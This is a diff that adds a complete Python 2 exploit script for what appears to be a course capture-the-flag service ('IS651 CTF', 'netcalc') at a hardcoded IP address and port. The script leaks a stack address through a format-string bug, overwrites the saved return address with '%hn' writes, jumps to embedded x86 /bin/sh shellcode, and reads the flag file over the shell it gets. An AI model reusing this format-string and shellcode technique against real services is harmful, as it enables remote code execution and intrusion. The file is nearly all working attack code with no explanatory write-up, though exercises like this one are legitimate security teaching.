@@ -1,0 +1,51 @@
+from socket import *
+from select import select
+import struct
+import sys
+
+def le(addr):
+    return struct.pack('<I', addr)
+
+s = socket(AF_INET, SOCK_STREAM)
+if s.connect_ex(("143.248.38.212", 40006)) > 0:
+    print "Fail to connect"
+
+data = s.recv(10000) # blanks
+data = s.recv(10000) # IS651 CTF
+
+# 6th position has the address of the buffer due to strtol
+testStr = '%6$08x\n'
+s.send(testStr)
+
+data = s.recv(10000) # Invalid input:
+data = s.recv(10000) # showmenu
+
+# Parse, The buffer of next showMenu call is 0x20 less
+bufAddr = int(data[1:9], 16) - 0x20
+retAddr = bufAddr + (0x22c - 0x1c) # ret addr location
+
+lShort = (bufAddr + 8) % 0x10000
+hShort = (bufAddr + 8) / 0x10000
+
+# address of buf to return
+testStr = le(retAddr) + le(retAddr+2)
+# /bin/sh shellcode
+testStr += "\x31\xC0\x99\x50\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\xC1\xB0\x0B\xCD\x80"
+# address calculation
+testStr += '%' + str(lShort-len(testStr)) + 'd' + '%7$hn'
+testStr += '%' + str((0x10000 + hShort - lShort)%0x10000) + 'd' + '%8$hn'
+testStr += '\n'
+
+s.send(testStr)
+
+# read all
+while 1:
+    r, _, _ = select([s], [], [], 0.3)
+    if s in r: data = s.recv(10000)
+    else: break
+
+s.send("cat /home/netcalc/flag\n")
+while 1:
+    sys.stdout.write(s.recv(10000))
+
+s.close()
